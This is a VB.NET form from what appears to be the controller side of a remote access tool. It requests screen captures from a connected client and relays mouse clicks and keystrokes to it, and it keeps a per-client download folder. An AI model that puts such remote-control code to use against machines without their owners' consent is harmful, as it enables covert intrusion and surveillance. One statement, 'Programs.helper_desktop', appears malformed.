Imports System.ComponentModel
Imports Microsoft.VisualBasic.CompilerServices

Public Class RemoteDesktop
    Public C As Client
    Public CID As String
    Public Sz As Size
    Public op As New Point(1, 1)
    Private Sub RemoteDesktop_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Programs.helper_desktop
        _keysPressed = New List(Of Keys)()
        Try
            Timer2.Start()
            ComboBox1.Text = "30%"
            Button2.PerformClick()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RemoteDesktop_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Button2.Text = "OFF"
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            ToolStripStatusLabel1.Text = "Size :" & PictureBox1.Width.ToString & "x" & PictureBox1.Height.ToString
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Button2.Text = "OFF" Then
            Button2.Text = "Capturing..."

            Dim B As Byte() = SB("RD+" + Settings.SPL + PictureBox1.Width.ToString + Settings.SPL + PictureBox1.Height.ToString + Settings.SPL + ComboBox1.Text.Replace("%", "").ToString)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Else
            Button2.Text = "OFF"
        End If
    End Sub



    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        PictureBox1.Focus()
    End Sub

    Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseUp
        If ToolStripStatusLabel2.ForeColor = Color.Green Then

            If Button2.Text = "Capturing..." Then
                Dim PP = New Point(e.X * (Sz.Width / PictureBox1.Width), e.Y * (Sz.Height / PictureBox1.Height))
                Dim but As Integer
                If e.Button = Windows.Forms.MouseButtons.Left Then
                    but = 4
                End If
                If e.Button = Windows.Forms.MouseButtons.Right Then
                    but = 16
                End If

                Dim B As Byte() = SB("###" + Settings.SPL & PP.X & Settings.SPL & PP.Y & Settings.SPL & but)
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            End If
        End If
    End Sub
    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        If ToolStripStatusLabel2.ForeColor = Color.Green Then
            If Button2.Text = "Capturing..." Then
                Dim PP = New Point(e.X * (Sz.Width / PictureBox1.Width), e.Y * (Sz.Height / PictureBox1.Height))
                If PP <> op Then
                    op = PP

                End If
            End If
        End If
    End Sub

    Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDown
        If ToolStripStatusLabel2.ForeColor = Color.Green Then
            If Button2.Text = "Capturing..." Then
                Dim PP = New Point(e.X * (Sz.Width / PictureBox1.Width), e.Y * (Sz.Height / PictureBox1.Height))
                Dim but As Integer
                If e.Button = Windows.Forms.MouseButtons.Left Then
                    but = 2
                End If
                If e.Button = Windows.Forms.MouseButtons.Right Then
                    but = 8
                End If


                Dim B As Byte() = SB("###" & Settings.SPL & PP.X & Settings.SPL & PP.Y & Settings.SPL & but)
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            End If
        End If
    End Sub
    Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel2.Click
        If ToolStripStatusLabel2.ForeColor = Color.Green Then
            ToolStripStatusLabel2.ForeColor = Color.White
        Else
            ToolStripStatusLabel2.ForeColor = Color.Green
        End If
    End Sub

    Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel3.Click
        If ToolStripStatusLabel3.ForeColor = Color.Green Then
            ToolStripStatusLabel3.ForeColor = Color.White
        Else
            PictureBox1.Focus()
            ToolStripStatusLabel3.ForeColor = Color.Green
        End If
    End Sub
    Private Function IsLockKey(ByVal key As Keys) As Boolean
        Return ((key And Keys.CapsLock) = Keys.CapsLock) OrElse ((key And Keys.NumLock) = Keys.NumLock) OrElse ((key And Keys.Scroll) = Keys.Scroll)
    End Function


    Private Sub PictureBox1_KeyUp(sender As Object, e As KeyEventArgs) Handles PictureBox1.KeyUp
        If ToolStripStatusLabel3.ForeColor = Color.Green Then
            If Button2.Text = "Capturing..." Then
                If Not IsLockKey(e.KeyCode) Then e.Handled = True
                _keysPressed.Remove(e.KeyCode)


                Dim B As Byte() = SB("^^^&" & Settings.SPL & e.KeyCode & Settings.SPL & "False")
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            End If
        End If
    End Sub

    Private Sub PictureBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles PictureBox1.KeyDown
        If ToolStripStatusLabel3.ForeColor = Color.Green Then
            If Button2.Text = "Capturing..." Then
                If Not IsLockKey(e.KeyCode) Then e.Handled = True
                If _keysPressed.Contains(e.KeyCode) Then Return
                _keysPressed.Add(e.KeyCode)


                Dim B As Byte() = SB("^^^&" & Settings.SPL & e.KeyCode & Settings.SPL & "True")
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            End If
        End If
    End Sub
    Public _keysPressed As New List(Of Keys)

    Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel4.Click
        If ToolStripStatusLabel4.ForeColor = Color.Green Then
            ToolStripStatusLabel4.ForeColor = Color.White
        Else
            Try
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\Monitor") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\Monitor")
                End If
                Process.Start(Application.StartupPath & "\Downloads" & "\" & CID & "\Monitor")
                ToolStripStatusLabel4.ForeColor = Color.Green
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub
End Class